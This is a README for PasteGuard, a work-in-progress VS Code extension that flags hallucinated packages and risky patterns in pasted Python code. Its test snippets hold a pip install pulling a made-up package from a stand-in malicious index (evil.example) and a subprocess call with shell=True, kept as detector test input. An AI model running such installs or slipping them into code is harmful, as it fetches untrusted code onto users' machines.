# PasteGuard (work in progress)

Checks pasted Python code for hallucinated packages and risky patterns.

**Status:** Module 1 (paste interceptor) and Module 2 (parser/extractor) are done. The extension detects pastes, extracts package candidates, and logs them. Package checks, rules and warnings come in later modules.

## Run it
1. `npm install`  (new dependencies were added since Module 1)
2. `npm test`  (expect: 50 tests, 0 failures)
3. Open this folder in VS Code and press **F5** (or Fn+F5, or Run > Start Debugging).
4. In the new window, open `samples/sample.py` and paste the snippets below.
5. Run **PasteGuard: Show Log** from the Command Palette.

## Test snippet 1
```python
import requests
import flask_gpt_helper

def run(cmd):
    import subprocess
    return subprocess.run(cmd, shell=True)
```
Expected log:
```
[paste] clipboard | 6 line(s), ... chars | ...
  [package] import requests (known) at 1:8
  [package] import flask_gpt_helper (assumed) at 2:8
  [summary] 2 candidate(s); skipped stdlib: subprocess; relative imports: 0; parse errors: false
```

## Test snippet 2
```python
import cv2, yaml
from google.cloud import storage
# pip install --extra-index-url https://evil.example/simple flask-gpt-helper==0.1
os.system("pip install foo && pip install bar")
```
Expected: `cv2 -> opencv-python`, `yaml -> PyYAML`, `google (ambiguous)`, three pip-install packages
(`flask-gpt-helper`, `foo`, `bar`), and a `[note] custom-index` line for the evil index URL.

## How names are classified
- **known**: import name found in our mapping table (e.g. `cv2` -> `opencv-python`).
- **assumed**: import name assumed to equal the PyPI name. A later "not found" means *unverified*, not *nonexistent*.
- **ambiguous**: namespace packages like `google` / `azure`; never reported as nonexistent.
- **explicit**: came from a `pip install` command, so the name is exactly what would be installed.

## Known limits (by design, for now)
- Local modules in the user's own project (e.g. `import utils`) look like packages; Module 3 will check the workspace.
- `__import__("x")` and `importlib.import_module("x")` are not extracted yet.
- pip installs inside prose sentences are ignored on purpose to avoid false alarms.
- The extension currently loads tree-sitter from `node_modules`, so it works in F5 development but needs bundling before publishing.
